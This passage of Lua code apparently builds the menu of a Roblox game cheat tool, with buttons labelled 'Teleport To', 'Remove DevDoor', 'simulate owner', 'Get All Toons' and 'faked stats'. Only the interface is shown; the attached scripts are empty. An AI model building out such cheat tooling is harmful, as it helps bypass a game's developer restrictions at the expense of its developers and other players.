G2L["120"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainThird.Aut.LocalScript
G2L["121"] = Instance.new("LocalScript", G2L["11f"]);


-- StarterGui.DebugVersion.Title.script_content.greetings
G2L["122"] = Instance.new("Frame", G2L["3"]);
G2L["122"]["BorderSizePixel"] = 0;
G2L["122"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["122"]["BackgroundTransparency"] = 1;
G2L["122"]["Size"] = UDim2.new(0, 378, 0, 368);
G2L["122"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["122"]["Position"] = UDim2.new(0, 0, 0.05128201097249985, 0);
G2L["122"]["Visible"] = false;
G2L["122"]["Name"] = [[greetings]];

-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES
G2L["123"] = Instance.new("Frame", G2L["122"]);
G2L["123"]["BorderSizePixel"] = 0;
G2L["123"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["123"]["BackgroundTransparency"] = 1;
G2L["123"]["Size"] = UDim2.new(0, 378, 0, 302);
G2L["123"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["123"]["Position"] = UDim2.new(-0.00048077295650728047, 0, 0.1823672354221344, 0);
G2L["123"]["Name"] = [[NAMES]];

-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES.UIListLayout
G2L["124"] = Instance.new("UIListLayout", G2L["123"]);
G2L["124"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES.NamesScripter
G2L["125"] = Instance.new("LocalScript", G2L["123"]);
G2L["125"]["Name"] = [[NamesScripter]];

-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES.NamesScripter.TextLabelTemplate
G2L["126"] = Instance.new("TextLabel", G2L["125"]);
G2L["126"]["TextWrapped"] = true;
G2L["126"]["TextStrokeTransparency"] = 0;
G2L["126"]["BorderSizePixel"] = 0;
G2L["126"]["TextScaled"] = true;
G2L["126"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["126"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["126"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["126"]["TextSize"] = 14;
G2L["126"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["126"]["Size"] = UDim2.new(0, 120, 0, 22);
G2L["126"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["126"]["Text"] = [[all my fans]];
G2L["126"]["Name"] = [[TextLabelTemplate]];
G2L["126"]["BackgroundTransparency"] = 1;

-- StarterGui.DebugVersion.Title.script_content.greetings.GreetingButton
G2L["127"] = Instance.new("TextButton", G2L["122"]);
G2L["127"]["TextWrapped"] = true;
G2L["127"]["TextStrokeTransparency"] = 0;
G2L["127"]["BorderSizePixel"] = 0;
G2L["127"]["TextScaled"] = true;
G2L["127"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["127"]["TextSize"] = 14;
G2L["127"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["127"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["127"]["Size"] = UDim2.new(0, 264, 0, 72);
G2L["127"]["Name"] = [[GreetingButton]];
G2L["127"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["127"]["Text"] = [[Greetings To]];
G2L["127"]["Position"] = UDim2.new(0.1509999930858612, 0, 0.02199999988079071, 0);
G2L["127"]["BackgroundTransparency"] = 1;

-- StarterGui.DebugVersion.Title.script_content.greetings.GreetingButton.LocalScript
G2L["128"] = Instance.new("LocalScript", G2L["127"]);


-- StarterGui.DebugVersion.Title.script_content.greetings.GreetingButton.LocalScript
G2L["129"] = Instance.new("LocalScript", G2L["127"]);


-- StarterGui.DebugVersion.Title.script_content.greetings.GreetingButton.LocalScript
G2L["12a"] = Instance.new("LocalScript", G2L["127"]);


-- StarterGui.DebugVersion.Title.script_content.greetings.GreetingButton.LocalScript
G2L["12b"] = Instance.new("LocalScript", G2L["127"]);


-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES2
G2L["12c"] = Instance.new("Frame", G2L["122"]);
G2L["12c"]["BorderSizePixel"] = 0;
G2L["12c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12c"]["BackgroundTransparency"] = 1;
G2L["12c"]["Size"] = UDim2.new(0, 378, 0, 302);
G2L["12c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12c"]["Position"] = UDim2.new(-0.00048077295650728047, 0, 0.1823672354221344, 0);
G2L["12c"]["Visible"] = false;
G2L["12c"]["Name"] = [[NAMES2]];

-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES2.UIListLayout
G2L["12d"] = Instance.new("UIListLayout", G2L["12c"]);
G2L["12d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES2.Names2Scripter
G2L["12e"] = Instance.new("LocalScript", G2L["12c"]);
G2L["12e"]["Name"] = [[Names2Scripter]];

-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES2.Names2Scripter.TextLabelTemplate
G2L["12f"] = Instance.new("TextLabel", G2L["12e"]);
G2L["12f"]["TextWrapped"] = true;
G2L["12f"]["TextStrokeTransparency"] = 0;
G2L["12f"]["BorderSizePixel"] = 0;
G2L["12f"]["TextScaled"] = true;
G2L["12f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12f"]["TextSize"] = 14;
G2L["12f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12f"]["Size"] = UDim2.new(0, 120, 0, 22);
G2L["12f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12f"]["Text"] = [[all my fans]];
G2L["12f"]["Name"] = [[TextLabelTemplate]];
G2L["12f"]["BackgroundTransparency"] = 1;

-- StarterGui.DebugVersion.Title.script_content.MainFive
G2L["130"] = Instance.new("Frame", G2L["3"]);
G2L["130"]["BorderSizePixel"] = 0;
G2L["130"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["130"]["BackgroundTransparency"] = 1;
G2L["130"]["Size"] = UDim2.new(0, 378, 0, 368);
G2L["130"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["130"]["Position"] = UDim2.new(0, 0, 0.05128201097249985, 0);
G2L["130"]["Visible"] = false;
G2L["130"]["Name"] = [[MainFive]];

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["131"] = Instance.new("TextButton", G2L["130"]);
G2L["131"]["TextWrapped"] = true;
G2L["131"]["TextStrokeTransparency"] = 0;
G2L["131"]["BorderSizePixel"] = 0;
G2L["131"]["TextScaled"] = true;
G2L["131"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["131"]["TextSize"] = 14;
G2L["131"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["131"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["131"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["131"]["Name"] = [[asd]];
G2L["131"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["131"]["Text"] = [[Skin summons]];
G2L["131"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.14673912525177002, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["132"] = Instance.new("UIStroke", G2L["131"]);
G2L["132"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["132"]["Thickness"] = 3;
G2L["132"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["133"] = Instance.new("LocalScript", G2L["131"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.Target
G2L["134"] = Instance.new("TextLabel", G2L["130"]);
G2L["134"]["TextWrapped"] = true;
G2L["134"]["TextStrokeTransparency"] = 0;
G2L["134"]["BorderSizePixel"] = 0;
G2L["134"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["134"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["134"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["134"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["134"]["TextSize"] = 30;
G2L["134"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["134"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["134"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["134"]["Text"] = [[Teleport To]];
G2L["134"]["Name"] = [[Target]];
G2L["134"]["BackgroundTransparency"] = 1;
G2L["134"]["Position"] = UDim2.new(0.024000056087970734, 0, 0.03319566324353218, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.Target.UICorner
G2L["135"] = Instance.new("UICorner", G2L["134"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["136"] = Instance.new("TextButton", G2L["130"]);
G2L["136"]["TextWrapped"] = true;
G2L["136"]["TextStrokeTransparency"] = 0;
G2L["136"]["BorderSizePixel"] = 0;
G2L["136"]["TextScaled"] = true;
G2L["136"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["136"]["TextSize"] = 14;
G2L["136"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["136"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["136"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["136"]["Name"] = [[asd]];
G2L["136"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["136"]["Text"] = [[mastery room]];
G2L["136"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.14673912525177002, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["137"] = Instance.new("UIStroke", G2L["136"]);
G2L["137"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["137"]["Thickness"] = 3;
G2L["137"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["138"] = Instance.new("LocalScript", G2L["136"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.Target
G2L["139"] = Instance.new("TextLabel", G2L["130"]);
G2L["139"]["TextWrapped"] = true;
G2L["139"]["TextStrokeTransparency"] = 0;
G2L["139"]["BorderSizePixel"] = 0;
G2L["139"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["139"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["139"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["139"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["139"]["TextSize"] = 30;
G2L["139"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["139"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["139"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["139"]["Text"] = [[(OLD)Functions]];
G2L["139"]["Name"] = [[Target]];
G2L["139"]["BackgroundTransparency"] = 1;
G2L["139"]["Position"] = UDim2.new(0.024000056087970734, 0, 0.25058695673942566, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.Target.UICorner
G2L["13a"] = Instance.new("UICorner", G2L["139"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["13b"] = Instance.new("TextButton", G2L["130"]);
G2L["13b"]["TextWrapped"] = true;
G2L["13b"]["TextStrokeTransparency"] = 0;
G2L["13b"]["BorderSizePixel"] = 0;
G2L["13b"]["TextScaled"] = true;
G2L["13b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13b"]["TextSize"] = 14;
G2L["13b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13b"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["13b"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["13b"]["Name"] = [[asd]];
G2L["13b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13b"]["Text"] = [[Remove DevDoor]];
G2L["13b"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.33152174949645996, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["13c"] = Instance.new("UIStroke", G2L["13b"]);
G2L["13c"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["13c"]["Thickness"] = 3;
G2L["13c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["13d"] = Instance.new("LocalScript", G2L["13b"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["13e"] = Instance.new("TextButton", G2L["130"]);
G2L["13e"]["TextWrapped"] = true;
G2L["13e"]["TextStrokeTransparency"] = 0;
G2L["13e"]["BorderSizePixel"] = 0;
G2L["13e"]["TextScaled"] = true;
G2L["13e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13e"]["TextSize"] = 14;
G2L["13e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13e"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["13e"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["13e"]["Name"] = [[asd]];
G2L["13e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13e"]["Text"] = [[Go To A Machine]];
G2L["13e"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.33152174949645996, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["13f"] = Instance.new("UIStroke", G2L["13e"]);
G2L["13f"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["13f"]["Thickness"] = 3;
G2L["13f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["140"] = Instance.new("LocalScript", G2L["13e"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["141"] = Instance.new("TextButton", G2L["130"]);
G2L["141"]["TextWrapped"] = true;
G2L["141"]["TextStrokeTransparency"] = 0;
G2L["141"]["BorderSizePixel"] = 0;
G2L["141"]["TextScaled"] = true;
G2L["141"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["141"]["TextSize"] = 14;
G2L["141"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["141"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["141"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["141"]["Name"] = [[asd]];
G2L["141"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["141"]["Text"] = [[Get Current Monsters RESEARCH]];
G2L["141"]["Position"] = UDim2.new(0.679894208908081, 0, 0.33152174949645996, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["142"] = Instance.new("UIStroke", G2L["141"]);
G2L["142"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["142"]["Thickness"] = 3;
G2L["142"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["143"] = Instance.new("LocalScript", G2L["141"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["144"] = Instance.new("TextButton", G2L["130"]);
G2L["144"]["TextWrapped"] = true;
G2L["144"]["TextStrokeTransparency"] = 0;
G2L["144"]["BorderSizePixel"] = 0;
G2L["144"]["TextScaled"] = true;
G2L["144"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["144"]["TextSize"] = 14;
G2L["144"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["144"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["144"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["144"]["Name"] = [[asd]];
G2L["144"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["144"]["Text"] = [[Auto-GoToElevator?!]];
G2L["144"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.46195653080940247, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["145"] = Instance.new("UIStroke", G2L["144"]);
G2L["145"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["145"]["Thickness"] = 3;
G2L["145"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["146"] = Instance.new("LocalScript", G2L["144"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.Aut
G2L["147"] = Instance.new("TextButton", G2L["130"]);
G2L["147"]["TextWrapped"] = true;
G2L["147"]["TextStrokeTransparency"] = 0;
G2L["147"]["BorderSizePixel"] = 0;
G2L["147"]["TextScaled"] = true;
G2L["147"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["147"]["TextSize"] = 14;
G2L["147"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["147"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["147"]["Size"] = UDim2.new(0, 107, 0, 27);
G2L["147"]["Name"] = [[Aut]];
G2L["147"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["147"]["Text"] = [[FOUR PAGE]];
G2L["147"]["Position"] = UDim2.new(0.6904761791229248, 0, 0.8804348111152649, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.Aut.UIStroke
G2L["148"] = Instance.new("UIStroke", G2L["147"]);
G2L["148"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["148"]["Thickness"] = 3;
G2L["148"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.Aut.LocalScript
G2L["149"] = Instance.new("LocalScript", G2L["147"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["14a"] = Instance.new("TextButton", G2L["130"]);
G2L["14a"]["TextWrapped"] = true;
G2L["14a"]["TextStrokeTransparency"] = 0;
G2L["14a"]["BorderSizePixel"] = 0;
G2L["14a"]["TextScaled"] = true;
G2L["14a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14a"]["TextSize"] = 14;
G2L["14a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14a"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["14a"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["14a"]["Name"] = [[asd]];
G2L["14a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14a"]["Text"] = [[Auto-Activate items]];
G2L["14a"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.46195653080940247, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["14b"] = Instance.new("UIStroke", G2L["14a"]);
G2L["14b"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["14b"]["Thickness"] = 3;
G2L["14b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["14c"] = Instance.new("LocalScript", G2L["14a"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["14d"] = Instance.new("TextButton", G2L["130"]);
G2L["14d"]["TextWrapped"] = true;
G2L["14d"]["TextStrokeTransparency"] = 0;
G2L["14d"]["BorderSizePixel"] = 0;
G2L["14d"]["TextScaled"] = true;
G2L["14d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14d"]["TextSize"] = 14;
G2L["14d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14d"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["14d"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["14d"]["Name"] = [[asd]];
G2L["14d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14d"]["Text"] = [[simulate owner]];
G2L["14d"]["Position"] = UDim2.new(0.679894208908081, 0, 0.46195653080940247, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["14e"] = Instance.new("UIStroke", G2L["14d"]);
G2L["14e"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["14e"]["Thickness"] = 3;
G2L["14e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["14f"] = Instance.new("LocalScript", G2L["14d"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["150"] = Instance.new("TextButton", G2L["130"]);
G2L["150"]["TextWrapped"] = true;
G2L["150"]["TextStrokeTransparency"] = 0;
G2L["150"]["BorderSizePixel"] = 0;
G2L["150"]["TextScaled"] = true;
G2L["150"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["150"]["TextSize"] = 14;
G2L["150"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["150"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["150"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["150"]["Name"] = [[asd]];
G2L["150"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["150"]["Text"] = [[Loop Sprout Self Heal]];
G2L["150"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.6711956262588501, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["151"] = Instance.new("UIStroke", G2L["150"]);
G2L["151"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["151"]["Thickness"] = 3;
G2L["151"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["152"] = Instance.new("LocalScript", G2L["150"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.Target
G2L["153"] = Instance.new("TextLabel", G2L["130"]);
G2L["153"]["TextWrapped"] = true;
G2L["153"]["TextStrokeTransparency"] = 0;
G2L["153"]["BorderSizePixel"] = 0;
G2L["153"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["153"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["153"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["153"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["153"]["TextSize"] = 30;
G2L["153"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["153"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["153"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["153"]["Text"] = [[Ability Mods]];
G2L["153"]["Name"] = [[Target]];
G2L["153"]["BackgroundTransparency"] = 1;
G2L["153"]["Position"] = UDim2.new(0.02135455422103405, 0, 0.5658043622970581, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.Target.UICorner
G2L["154"] = Instance.new("UICorner", G2L["153"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["155"] = Instance.new("TextButton", G2L["130"]);
G2L["155"]["TextWrapped"] = true;
G2L["155"]["TextStrokeTransparency"] = 0;
G2L["155"]["BorderSizePixel"] = 0;
G2L["155"]["TextScaled"] = true;
G2L["155"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["155"]["TextSize"] = 14;
G2L["155"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["155"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["155"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["155"]["Name"] = [[asd]];
G2L["155"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["155"]["Text"] = [[Auto Activate]];
G2L["155"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.6711956262588501, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["156"] = Instance.new("UIStroke", G2L["155"]);
G2L["156"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["156"]["Thickness"] = 3;
G2L["156"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["157"] = Instance.new("LocalScript", G2L["155"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["158"] = Instance.new("TextButton", G2L["130"]);
G2L["158"]["TextWrapped"] = true;
G2L["158"]["TextStrokeTransparency"] = 0;
G2L["158"]["BorderSizePixel"] = 0;
G2L["158"]["TextScaled"] = true;
G2L["158"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["158"]["TextSize"] = 14;
G2L["158"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["158"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["158"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["158"]["Name"] = [[asd]];
G2L["158"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["158"]["Text"] = [[Sprout Heal LocalPlayer]];
G2L["158"]["Position"] = UDim2.new(0.679894208908081, 0, 0.6711956262588501, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["159"] = Instance.new("UIStroke", G2L["158"]);
G2L["159"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["159"]["Thickness"] = 3;
G2L["159"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["15a"] = Instance.new("LocalScript", G2L["158"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.Target
G2L["15b"] = Instance.new("TextLabel", G2L["130"]);
G2L["15b"]["TextWrapped"] = true;
G2L["15b"]["TextStrokeTransparency"] = 0;
G2L["15b"]["BorderSizePixel"] = 0;
G2L["15b"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["15b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15b"]["TextSize"] = 30;
G2L["15b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["15b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["Text"] = [[Simulation / faked stats]];
G2L["15b"]["Name"] = [[Target]];
G2L["15b"]["BackgroundTransparency"] = 1;
G2L["15b"]["Position"] = UDim2.new(0.02135455422103405, 0, 0.7614565491676331, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.Target.UICorner
G2L["15c"] = Instance.new("UICorner", G2L["15b"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["15d"] = Instance.new("TextButton", G2L["130"]);
G2L["15d"]["TextWrapped"] = true;
G2L["15d"]["TextStrokeTransparency"] = 0;
G2L["15d"]["BorderSizePixel"] = 0;
G2L["15d"]["TextScaled"] = true;
G2L["15d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15d"]["TextSize"] = 14;
G2L["15d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15d"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["15d"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["15d"]["Name"] = [[asd]];
G2L["15d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15d"]["Text"] = [[Get All Toons]];
G2L["15d"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.8804348111152649, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["15e"] = Instance.new("UIStroke", G2L["15d"]);
G2L["15e"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["15e"]["Thickness"] = 3;
G2L["15e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
